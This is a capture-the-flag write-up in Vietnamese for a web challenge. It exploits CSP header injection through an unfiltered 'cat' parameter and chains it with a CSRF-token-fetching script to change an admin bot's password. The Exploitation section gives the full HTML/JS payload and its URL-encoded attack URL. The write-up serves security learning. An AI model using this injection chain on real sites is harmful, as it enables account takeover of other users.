# cutie web framework

## Challenge Information
- **Category**: Web Exploitation
- **Event**: BKSEC TTV 2026
- **Tags**: #web #CSP #CSRF
---
## 1. Description
>Do you know that most of the talented developers are weeboo? I invite you to eat some Bun and play with Elysia-chan! [https://elysiajs.com/](https://elysiajs.com/)
## 2. Overview
Bài với mục tiêu giới thiệu framework là chính cũng như phần GraphQL Playground trong graphql-yoga
## 3. Reconnaissance
Khi mở trang web, em có xem các tính năng cơ bản:
- `/`: Trang chủ hiển thị các bài viết.
- `/api/search`: Có vẻ an toàn vì được `escape(q)`.
- `/settings/change_password`: Tính năng đổi mật khẩu có cơ chế chống CSRF bằng token `_t` và cookie `_ct`. Nhưng nó lại không yêu cầu pass cũ
- `/report`: Em đoán một con bot Admin (có thể người thật) sẽ truy cập để xem trang web mình báo cáo lên
Và một số trang khác:

![](images/Pasted%20image%2020260308115221.png)

![](images/Pasted%20image%2020260308115232.png)

![](images/Pasted%20image%2020260308115247.png)

![](images/Pasted%20image%2020260308115255.png)

-> với mô típ này em đoán có lẽ nó sẽ dính XSS nhưng chưa thể kết luận, xem file app.py một chút thì em có thấy đoạn code:

```python
cat_filter = request.args.get("cat", "").strip().lower()
if cat_filter and cat_filter not in CATEGORIES:
    csp = (f"... report-uri /csp-report?source={cat_filter}")
    resp = Response(f"Unknown category: {cat_filter}...", status=400)
    resp.headers["Content-Security-Policy"] = csp
    return resp
```

Mặc dù có các tính năng CSP rất chặt nhưng biến `cat_filter` lại được nối trực tiếp vào mà không qua bộ lọc nào -> ta có thể nghĩ đến việc chèn dấu `;` để inject mã độc. Tiếp theo em có nhờ AI phân tích các CSP thì có phát hiện `script-src-elem` sẽ ghi đè lên `script-src` hoàn toàn đối với các thẻ `<script>`:

![](images/Pasted%20image%2020260308114000.png)

Và AI cũng gợi ý cách khai thác bài này cho em:

![](images/Pasted%20image%2020260308114057.png)

Lỗ hổng nguy hiểm nhất ở đây là việc đổi `password` không yêu cầu `password` cũ, -> kết hợp với AI em nghĩ rằng mình có thể tạo ra một trang web điều hướng con bot đến api đổi `password` thành `password` mà mình biết, sau đó đăng nhập bằng quyền admin và vào trang quản trị để lấy flag.

Và bằng việc đoán mò thì em cũng tìm ra được email của admin là `admin@feedbin.local`

![](images/Pasted%20image%2020260308115153.png)
## 4. Exploitation
Sau khi tâm sự với AI một lúc và nhờ phân tích source của file `app.py` thì bạn đã gợi ý cho em payload để đổi `password` của admin như sau:

```html
x;script-src-elem 'unsafe-inline';
<form id="f" method="post" action="/settings/change_password">
  <input id="t" name="_t">
  <input name="new_pw" value="hacked123">
  <input name="new_pw_confirm" value="hacked123">
</form>
<script>
  async function x(){
    let r = await fetch('/settings/change_password');
    let h = await r.text();
    // Regex tìm giá trị của token _t
    let m = h.match(/name="_t" value="([^"]+)"/);
    t.value = m[1]; // Gán token vào form
    f.submit();     // Gửi lệnh đổi mật khẩu
  }
  x();
</script>
```

-> URL encode để gửi bot:
```http
http://app:5000/feed?cat=x%3bscript-src-elem%20'unsafe-inline'%3b%3cform%20id%3df%20method%3dpost%20action%3d%2fsettings%2fchange_password%3e%3cinput%20id%3dt%20name%3d_t%3e%3cinput%20name%3dnew_pw%20value%3dhacked123%3e%3cinput%20name%3dnew_pw_confirm%20value%3dhacked123%3e%3c%2fform%3e%3cscript%3easync%20function%20x()%7blet%20r%3dawait%20fetch('%2fsettings%2fchange_password')%3blet%20h%3dawait%20r.text()%3blet%20m%3dh.match(%2fname%3d%22_t%22%20value%3d%22(%5b%5e%22%5d%2b)%22%2f)%3bt.value%3dm%5b1%5d%3bf.submit()%7dx()%3c%2fscript%3e
```

Sau khi gửi payload này, đợi một lúc để bot Admin truy cập và lúc này tài khoản admin sẽ được đổi `password` thành `hacked123`

Em sẽ truy cập `/admin/dashboard` để lấy flag

